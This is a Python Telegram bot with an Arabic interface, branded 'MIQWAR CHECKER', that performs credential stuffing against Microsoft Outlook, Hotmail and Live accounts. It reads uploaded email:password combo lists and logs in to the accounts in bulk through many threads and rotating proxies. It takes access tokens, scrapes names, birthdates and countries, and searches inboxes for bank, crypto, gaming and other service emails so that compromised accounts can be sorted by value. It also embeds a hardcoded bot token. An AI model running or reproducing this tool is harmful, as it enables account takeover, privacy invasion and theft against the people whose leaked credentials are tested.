#!/usr/bin/env python3

import requests
import json
import uuid
import re
import time
import os
import sys
import threading
import concurrent.futures
import pycountry
import telebot
from telebot import types
from datetime import datetime
from pathlib import Path
from threading import Lock

BOT_TOKEN = "8705619356:AAE7DR01_-mZZ21sR04hEXjW1fPfpPOTSEE"
CHAT_ID = "8556606989"

scanning = False
stop_scan = False
current_results = []
current_status_message = None

class Colors:
    YELLOW = "\033[38;5;220m"
    YELLOW_DIM = "\033[38;5;214m"
    YELLOW_BRIGHT = "\033[38;5;228m"
    GREEN = "\033[38;5;118m"
    RED = "\033[38;5;196m"
    WHITE = "\033[38;5;255m"
    CYAN = "\033[38;5;81m"
    MAGENTA = "\033[38;5;129m"
    GRAY = "\033[38;5;245m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

Y = Colors.YELLOW
YD = Colors.YELLOW_DIM
YB = Colors.YELLOW_BRIGHT
G = Colors.GREEN
R = Colors.RED
W = Colors.WHITE
C = Colors.CYAN
M = Colors.MAGENTA
GY = Colors.GRAY
RS = Colors.RESET
BD = Colors.BOLD

SETTINGS = {
    "threads": 50,
    "telegram_token": BOT_TOKEN,
    "telegram_chat": CHAT_ID,
    "telegram_on": True,
    "webhook_url": "",
    "webhook_on": False,
    "proxy_file": "",
    "proxy_type": "http",
    "use_proxy": False,
    "debug": False,
    "delay": 0.05,
}

_proxy_list = []
_proxy_lock = threading.Lock()
_proxy_index = 0

def load_proxies():
    global _proxy_list
    pf = SETTINGS.get("proxy_file", "")
    if not pf or not os.path.exists(pf):
        return
    with open(pf, encoding="utf-8", errors="ignore") as f:
        _proxy_list = [l.strip() for l in f if l.strip()]

def next_proxy():
    global _proxy_index
    if not _proxy_list:
        return None
    with _proxy_lock:
        p = _proxy_list[_proxy_index % len(_proxy_list)]
        _proxy_index += 1
    pt = SETTINGS.get("proxy_type", "http")
    url = f"{pt}://{p}"
    return {"http": url, "https": url}

DEFAULT_SERVICES = {
    'security@facebookmail.com': 'فيسبوك',
    'security@mail.instagram.com': 'انستقرام',
    'no-reply@mail.instagram.com': 'انستقرام',
    'register@account.tiktok.com': 'تيك توك',
    'info@x.com': 'تويتر',
    'notifications@twitter.com': 'تويتر',
    'security-noreply@linkedin.com': 'لينكد إن',
    'notifications-noreply@linkedin.com': 'لينكد إن',
    'no-reply@pinterest.com': 'بينتريست',
    'noreply@reddit.com': 'ريديت',
    'no-reply@accounts.snapchat.com': 'سناب شات',
    'noreply@vk.com': 'فكونتاكتي',
    'no-reply@tinder.com': 'تيندر',
    'no-reply@bumble.com': 'بامبل',
    'no-reply@whatsapp.com': 'واتساب',
    'info@whatsapp.com': 'واتساب',
    'telegram.org': 'تيليجرام',
    'noreply@discord.com': 'ديسكورد',
    'email@discord.com': 'ديسكورد',
    'no-reply@signal.org': 'سيغنال',
    'no-reply@line.me': 'لاين',
    'info@account.netflix.com': 'نتفليكس',
    'no-reply@spotify.com': 'سبوتيفاي',
    'no-reply@twitch.tv': 'تويتش',
    'noreply@twitch.tv': 'تويتش',
    'no-reply@youtube.com': 'يوتيوب',
    'no-reply@disneyplus.com': 'ديزني بلس',
    'noreply@disneyplus.com': 'ديزني بلس',
    'account@hulu.com': 'هولو',
    'no-reply@hbomax.com': 'إتش بي أو ماكس',
    'auto-confirm@amazon.com': 'أمازون برايم',
    'no-reply@apple.com': 'آبل',
    'noreply@crunchyroll.com': 'كرانشي رول',
    'info@Exxen.com': 'إكسين',
    'info@Tod.com': 'تود',
    'info@Tabii.com': 'تابي',
    'account-update@amazon.com': 'أمازون',
    'newuser@nuwelcome.ebay.com': 'إيباي',
    'no-reply@shopify.com': 'شوبيفاي',
    'transaction@etsy.com': 'إيتسي',
    'no-reply@aliexpress.com': 'علي إكسبرس',
    'no-reply@walmart.com': 'وول مارت',
    'noreply@trendyol.com': 'ترنديول',
    'info@pazarama.com': 'بازاراما',
    'service@paypal.com.br': 'باي بال',
    'do-not-reply@ses.binance.com': 'بينانس',
    'no-reply@coinbase.com': 'كوين بيز',
    'no-reply@kraken.com': 'كراكن',
    'noreply@okx.com': 'أو كي إكس',
    'no-reply@bybit.com': 'باي بيت',
    'no-reply@revolut.com': 'ريفولوت',
    'no-reply@venmo.com': 'فينمو',
    'no-reply@cash.app': 'كاش آب',
    'noreply@steampowered.com': 'ستيم',
    'xboxreps@engage.xbox.com': 'إكس بوكس',
    'noreply@xbox.com': 'إكس بوكس',
    'reply@txn-email.playstation.com': 'بلاي ستيشن',
    'help@acct.epicgames.com': 'إيبك جيمز',
    'no-reply@epicgames.com': 'إيبك',
    'noreply@rockstargames.com': 'روك ستار',
    'EA@e.ea.com': 'إي إيه سبورتس',
    'noreply@ubisoft.com': 'يوبيسوفت',
    'noreply@blizzard.com': 'بليزارد',
    'no-reply@riotgames.com': 'ريوت جيمز',
    'noreply@valorant.com': 'فالورانت',
    'noreply@hoyoverse.com': 'جينشين إمباكت',
    'noreply@pubgmobile.com': 'بابجي',
    'accounts@roblox.com': 'روبلكس',
    'noreply@mojang.com': 'ماين كرافت',
    'noreply@id.supercell.com': 'سوبر سيل',
    'no-reply@accounts.nintendo.com': 'نينتندو',
    'no-reply@wildrift.riotgames.com': 'وايلد ريفت',
    'noreply@valvesoftware.com': 'فالفي',
    'no-reply@innersloth.com': 'أمونغ أص',
    'no-reply@mediatonic.co.uk': 'فال جايز',
    'no-reply@accounts.google.com': 'جوجل',
    'account-security-noreply@accountprotection.microsoft.com': 'مايكروسوفت',
    'noreply@microsoft.com': 'مايكروسوفت',
    'info@yahoo.com': 'ياهو',
    'noreply@github.com': 'جيت هاب',
    'no-reply@dropbox.com': 'دروبوكس',
    'no-reply@zoom.us': 'زوم',
    'no-reply@slack.com': 'سلاك',
    'no-reply@notion.so': 'نوتيون',
    'no-reply@wordpress.com': 'ووردبريس',
    'no-reply@adobe.com': 'أدوبي',
    'no-reply@canva.com': 'كانفا',
    'no-reply@nordvpn.com': 'نورد في بي إن',
    'no-reply@expressvpn.com': 'إكسبريس في بي إن',
    'no-reply@surfshark.com': 'سيرف شارك',
    'no-reply@protonmail.com': 'بروتون ميل',
    'no-reply@bitwarden.com': 'بيت واردن',
    'no-reply@airbnb.com': 'إير بي إن بي',
    'no-reply@booking.com': 'بوكينغ',
    'no-reply@uber.com': 'أوبر',
    'no-reply@doordash.com': 'دور داش',
    'noreply@onlyfans.com': 'أونلي فانز',
    'no-reply@patreon.com': 'باتريون',
    'noreply@openai.com': 'تشات جي بي تي',
    'no-reply@anthropic.com': 'كلود',
    'noreply@midjourney.com': 'ميدجورني',
}

class OutlookChecker:
    def __init__(self, services=None):
        self.services = services if services else DEFAULT_SERVICES
        self.debug = SETTINGS.get("debug", False)

    def _log(self, msg):
        if self.debug:
            print(f"  {C}[تتبع]{RS} {GY}{msg}{RS}")

    def _country_name(self, code: str) -> str:
        if not code:
            return "غير معروف"
        code = code.strip().upper()
        try:
            c = pycountry.countries.get(alpha_2=code)
            return c.name if c else code
        except:
            return code

    def _flag(self, code: str) -> str:
        try:
            c = pycountry.countries.get(alpha_2=code.strip().upper())
            if c:
                return "".join(chr(0x1F1E6 + ord(ch) - ord("A")) for ch in c.alpha_2)
        except:
            pass
        return "🌍"

    def _parse_country(self, j) -> str:
        if not isinstance(j, dict):
            return ""
        for acc in j.get("accounts", []):
            loc = acc.get("location", "")
            if loc:
                return str(loc).strip()
        loc = j.get("location", "")
        if loc:
            if isinstance(loc, str):
                return loc.strip()
            if isinstance(loc, dict):
                for k in ("country", "countryOrRegion", "countryCode"):
                    if loc.get(k):
                        return str(loc[k])
        for k in ("country", "countryOrRegion", "countryCode"):
            v = j.get(k, "")
            if v:
                return str(v).strip()
        return ""

    def check(self, email: str, password: str):
        proxies = next_proxy() if SETTINGS.get("use_proxy") else None
        session = requests.Session()
        if proxies:
            session.proxies.update(proxies)
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        })
        country = ""
        name = ""
        birthdate = ""
        try:
            self._log(f"فحص المعرف: {email}")
            r1 = session.get(
                f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
                headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"},
                timeout=15
            )
            if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]):
                return self._bad()
            if "MSAccount" not in r1.text:
                return self._bad()

            self._log("بدء تدفق المصادقة")
            r2 = session.get(
                f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
                f"client_info=1&haschrome=1&login_hint={email}&mkt=en"
                f"&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
                timeout=15, allow_redirects=True
            )
            m_url = re.search(r'urlPost":"([^"]+)"', r2.text)
            m_ppft = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not m_url or not m_ppft:
                return self._bad()
            post_url = m_url.group(1).replace("\\/", "/")
            ppft = m_ppft.group(1)

            self._log("جاري تسجيل الدخول")
            login_data = (
                f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1"
                f"&lrt=&lrtPartition=&hisRegion=&hisScaleUnit="
                f"&passwd={password}&hpgrequestid=&PPFT={ppft}"
            )
            r3 = session.post(
                post_url, data=login_data,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                    "Origin": "https://login.live.com",
                    "Referer": r2.url,
                },
                allow_redirects=False, timeout=15
            )
            if any(x in r3.text for x in [
                "account or password is incorrect",
                "identity/confirm", "Abuse", "signedout", "locked"
            ]):
                return self._bad()
            
            if "proof" in r3.text or "challenge" in r3.text:
                return {"status": "2FA"}

            location = r3.headers.get("Location", "")
            if not location:
                return self._bad()
            m_code = re.search(r"code=([^&]+)", location)
            if not m_code:
                return self._bad()
            code = m_code.group(1)

            self._log("جلب رمز الوصول")
            r4 = session.post(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data=(
                    f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                    f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                    f"&grant_type=authorization_code&code={code}"
                    f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                ),
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=15
            )
            if "access_token" not in r4.text:
                return self._bad()
            token = r4.json()["access_token"]
            mspcid = session.cookies.get("MSPCID", str(uuid.uuid4()).replace("-", "").upper())
            cid = mspcid.upper()
            auth_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
            }

            self._log("جلب الملف الشخصي")
            try:
                r5 = session.get(
                    "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                    headers=auth_headers, timeout=15
                )
                if r5.status_code == 200:
                    p = r5.json()
                    country = self._parse_country(p)
                    accts = p.get("accounts", [{}])
                    a0 = accts[0] if accts else {}
                    name = a0.get("displayName", p.get("displayName", ""))
                    bd = a0.get("birthDay", "")
                    bm = a0.get("birthMonth", "")
                    by_ = a0.get("birthYear", "")
                    birthdate = f"{bd}-{bm}-{by_}" if bd else ""
            except:
                pass

            self._log("قراءة البريد الوارد")
            inbox_text = ""
            try:
                r6 = session.post(
                    f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0",
                    data="",
                    headers={
                        **auth_headers,
                        "Host": "outlook.live.com",
                        "content-length": "0",
                        "x-owa-sessionid": str(uuid.uuid4()),
                        "x-req-source": "Mini",
                        "content-type": "application/json; charset=utf-8",
                        "accept": "*/*",
                        "origin": "https://outlook.live.com",
                    },
                    timeout=30
                )
                inbox_text = r6.text.lower()
            except:
                pass

            services_found = []
            unique_services = set()
            for sender, svc_name in self.services.items():
                if svc_name in unique_services:
                    continue
                patterns = [
                    sender.lower(),
                    sender.lower().replace("@", " "),
                    sender.lower().replace(".", " "),
                    svc_name.lower(),
                ]
                for pat in patterns:
                    if pat in inbox_text:
                        services_found.append(svc_name)
                        unique_services.add(svc_name)
                        break

            country_code = country.strip().upper()[:2] if country else ""
            country_name = self._country_name(country_code)
            flag = self._flag(country_code)

            return {
                "status": "HIT" if services_found else "VALID",
                "country_code": country_code,
                "country": country_name,
                "flag": flag,
                "services_found": services_found,
                "services_count": len(services_found),
                "name": name,
                "birthdate": birthdate,
                "token": token,
                "session": session,
                "cid": cid,
            }
        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT"}
        except Exception as e:
            self._log(f"خطأ: {e}")
            return {"status": "ERROR"}

    def _bad(self):
        return {"status": "BAD"}

bot = telebot.TeleBot(BOT_TOKEN)

def send_welcome_panel(chat_id):
    welcome_text = """
🔥 *MIQWAR CHECKER BOT* 🔥

🎯 *بوت فحص حسابات مايكروسوفت*
📧 يدعم الحسابات: Outlook | Hotmail | Live

*الأوامر والخيارات المتاحة:*
━━━━━━━━━━━━━━━━
📁 /scan - بدء فحص ملف حسابات جديد
🛑 /stop - إيقاف عملية الفحص الجارية
📊 /status - عرض حالة وسرعة الفحص الحالية
⚙️ /settings - تعديل الخيوط والتأخير
━━━━━━━━━━━━━━━━
👤 صنع بكل فخر بواسطة: *MIQWAR*
    """
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    btn_scan = types.InlineKeyboardButton("📁 بدء الفحص", callback_data="trigger_scan")
    btn_status = types.InlineKeyboardButton("📊 الحالة", callback_data="trigger_status")
    btn_settings = types.InlineKeyboardButton("⚙️ الإعدادات", callback_data="trigger_settings")
    btn_stop = types.InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="trigger_stop")
    
    keyboard.add(btn_scan, btn_status)
    keyboard.add(btn_settings, btn_stop)
    
    try:
        bot.send_message(chat_id, welcome_text, parse_mode='Markdown', reply_markup=keyboard)
    except Exception as e:
        print(f"فشل الإرسال التلقائي إلى {chat_id}: {e}")

@bot.message_handler(commands=['start'])
def start_command(message):
    send_welcome_panel(message.chat.id)

@bot.message_handler(commands=['scan'])
def scan_command(message):
    bot.send_message(message.chat.id, 
                     "📁 *أرسل ملف الحسابات بصيغة TXT*\n\n"
                     "صيغة الملف:\n"
                     "`email@hotmail.com:password`\n\n"
                     "مثال:\n"
                     "`user@hotmail.com:pass123`",
                     parse_mode='Markdown')

@bot.message_handler(commands=['stop'])
def stop_command(message):
    global scanning, stop_scan
    if scanning:
        stop_scan = True
        bot.send_message(message.chat.id, "🛑 *جاري إيقاف الفحص... يرجى الانتظار*", parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id, "ℹ️ *لا يوجد فحص جارٍ حالياً*", parse_mode='Markdown')

@bot.message_handler(commands=['status'])
def status_command(message):
    if scanning:
        status_text = f"""
🟢 *حالة البوت:*

✅ *جارٍ الفحص...*
• عدد الخيوط: {SETTINGS['threads']} خيط ⚡
• التأخير: {SETTINGS['delay']} ثانية 🚀
• النتائج المسجلة: {len(current_results)} حساب

🛑 لإيقاف الفحص: `/stop`
        """
    else:
        status_text = f"""
🔴 *حالة البوت:*

⏸️ *في انتظار الأوامر*
• عدد الخيوط: {SETTINGS['threads']} خيط
• التأخير: {SETTINGS['delay']} ثانية

🚀 لبدء الفحص: `/scan`
        """
    bot.send_message(message.chat.id, status_text, parse_mode='Markdown')

@bot.message_handler(commands=['settings'])
def settings_command(message):
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    btn_threads = types.InlineKeyboardButton("🔧 عدد الخيوط", callback_data="set_threads")
    btn_delay = types.InlineKeyboardButton("⏱️ التأخير", callback_data="set_delay")
    keyboard.add(btn_threads, btn_delay)
    bot.send_message(message.chat.id, "⚙️ *اختر الإعداد المراد تعديله:*", 
                     parse_mode='Markdown', reply_markup=keyboard)

@bot.message_handler(content_types=['document'])
def handle_document(message):
    global scanning, stop_scan, current_results
    
    if scanning:
        bot.reply_to(message, "⚠️ *فحص قيد التشغيل حالياً*\nاستخدم /stop للإيقاف أولاً", parse_mode='Markdown')
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        filename = f"combos_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        file_path = os.path.join(os.getcwd(), filename)
        
        with open(file_path, 'wb') as f:
            f.write(downloaded_file)
        
        combos = []
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if ':' in line and '@' in line:
                    parts = line.split(':', 1)
                    email = parts[0].strip()
                    password = parts[1].split('|')[0].strip()
                    if email and password:
                        combos.append((email, password))
        
        if not combos:
            bot.reply_to(message, "❌ *لا توجد حسابات صالحة في الملف!*", parse_mode='Markdown')
            os.remove(file_path)
            return
        
        total = len(combos)
        bot.reply_to(message, f"✅ *تم تحميل {total} حساب*\n🚀 *جاري بدء الفحص (وضع السرعة القصوى)...*", parse_mode='Markdown')
        
        scanning = True
        stop_scan = False
        current_results = []
        
        thread = threading.Thread(target=run_scan_fast, args=(combos, message.chat.id, file_path))
        thread.start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ *خطأ:* {str(e)}", parse_mode='Markdown')
        scanning = False

def run_scan_fast(combos, chat_id, file_path):
    global scanning, stop_scan, current_results, current_status_message
    
    total = len(combos)
    checked = 0
    stats = {"HIT": 0, "VALID": 0, "2FA": 0, "BAD": 0, "ERROR": 0}
    results_data = {"HIT": [], "VALID": [], "2FA": [], "BAD": [], "ERROR": []}
    stats_lock = Lock()
    
    status_msg = bot.send_message(chat_id, f"📊 *بدأ الفحص السريع*\n📁 إجمالي الحسابات: {total}\n⚡ {SETTINGS['threads']} خيط متزامن\n\n⏳ جاري العمل...", parse_mode='Markdown')
    current_status_message = status_msg.message_id
    
    start_time = time.time()
    
    def process_account(email, password):
        nonlocal checked
        checker = OutlookChecker()
        result = checker.check(email, password)
        status = result.get("status", "ERROR")
        
        with stats_lock:
            checked += 1
            entry = f"{email}:{password}"
            if status == "HIT":
                stats["HIT"] += 1
                results_data["HIT"].append(f"{entry} | {result.get('services_found', [])}")
            elif status == "VALID":
                stats["VALID"] += 1
                results_data["VALID"].append(entry)
            elif status == "2FA":
                stats["2FA"] += 1
                results_data["2FA"].append(entry)
            elif status == "BAD":
                stats["BAD"] += 1
                results_data["BAD"].append(entry)
            else:
                stats["ERROR"] += 1
                results_data["ERROR"].append(entry)
            
            if checked % 20 == 0 or checked == total:
                elapsed = time.time() - start_time
                cpm = int((checked / max(0.1, elapsed)) * 60)
                
                # حساب النسبة المئوية بدقة
                percentage = int((checked / total) * 100)
                
                # تعديل الحجم إلى 20 ممتلئ وفارغ ليملأ الرسالة بالكامل
                bar_length = 20
                filled_blocks = int((percentage / 100) * bar_length)
                empty_blocks = bar_length - filled_blocks
                progress_bar = "■" * filled_blocks + "□" * empty_blocks
                
                progress_text = f"""
📊 *تحديث الفحص السريع*

 {progress_bar}   `{percentage}%`

✅ تم: {checked}/{total}
🎯 HIT: {stats['HIT']}
📧 VALID: {stats['VALID']}
🔐 2FA: {stats['2FA']}
❌ BAD: {stats['BAD']}
⚠️ ERROR: {stats['ERROR']}

⚡ السرعة: {cpm} ح/د
"""
                try:
                    bot.edit_message_text(progress_text, chat_id, current_status_message, parse_mode='Markdown')
                except:
                    pass
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=SETTINGS['threads']) as executor:
        futures = [executor.submit(process_account, email, password) for email, password in combos]
        for future in concurrent.futures.as_completed(futures):
            if stop_scan:
                break
            try:
                future.result()
            except:
                pass
    
    elapsed = time.time() - start_time
    minutes = int(elapsed // 60)
    seconds = int(elapsed % 60)
    cpm = int((checked / max(0.1, elapsed)) * 60)
    
    final_msg = f"""
✅ *اكتمل الفحص السريع!* ✅

📊 *النتائج النهائية*

📁 إجمالي: `{checked}`
✅ HIT: `{stats['HIT']}`
📧 VALID: `{stats['VALID']}`
🔐 2FA: `{stats['2FA']}`
❌ BAD: `{stats['BAD']}`
⚠️ ERROR: `{stats['ERROR']}`

⏱️ الوقت المستغرق: `{minutes} دقيقة {seconds} ثانية`
⚡ السرعة المتوسطة: `{cpm}` ح/د

━━━━━━━━━━━━━━━━
👤 *MIQWAR CHECKER*
"""
    bot.send_message(chat_id, final_msg, parse_mode='Markdown')
    
    for label, data in [("HIT", results_data["HIT"]), 
                        ("VALID", results_data["VALID"]), 
                        ("2FA", results_data["2FA"]), 
                        ("BAD", results_data["BAD"]), 
                        ("ERROR", results_data["ERROR"])]:
        if data:
            fn = f"{label}_{datetime.now().strftime('%H%M%S')}.txt"
            with open(fn, "w") as f:
                f.write("\n".join(data))
            with open(fn, "rb") as f:
                bot.send_document(chat_id, f, caption=f"📁 ملف {label}")
            os.remove(fn)
    
    try:
        os.remove(file_path)
    except:
        pass
    
    scanning = False
    stop_scan = False

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "set_threads":
        msg = bot.send_message(call.message.chat.id, "🔧 *أدخل عدد الخيوط (1-100):*", parse_mode='Markdown')
        bot.register_next_step_handler(msg, set_threads_value)
    
    elif call.data == "set_delay":
        msg = bot.send_message(call.message.chat.id, "⏱️ *أدخل التأخير بين الطلبات (0-1 ثانية):*", parse_mode='Markdown')
        bot.register_next_step_handler(msg, set_delay_value)
        
    elif call.data == "trigger_scan":
        scan_command(call.message)
    elif call.data == "trigger_status":
        status_command(call.message)
    elif call.data == "trigger_settings":
        settings_command(call.message)
    elif call.data == "trigger_stop":
        stop_command(call.message)

def set_threads_value(message):
    try:
        val = int(message.text.strip())
        if 1 <= val <= 100:
            SETTINGS["threads"] = val
            bot.send_message(message.chat.id, f"✅ *تم تعيين عدد الخيوط إلى {SETTINGS['threads']}*", parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "❌ *الرجاء إدخال رقم بين 1 و 100*", parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, "❌ *خطأ: الرجاء إدخال رقم صحيح*", parse_mode='Markdown')

def set_delay_value(message):
    try:
        val = float(message.text.strip())
        if 0 <= val <= 1:
            SETTINGS["delay"] = val
            bot.send_message(message.chat.id, f"✅ *تم تعيين التأخير إلى {SETTINGS['delay']} ثانية*", parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "❌ *الرجاء إدخال رقم بين 0 و 1*", parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, "❌ *خطأ: الرجاء إدخال رقم صحيح*", parse_mode='Markdown')

if __name__ == "__main__":
    print("🤖 البوت يعمل...")
    send_welcome_panel(CHAT_ID)
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
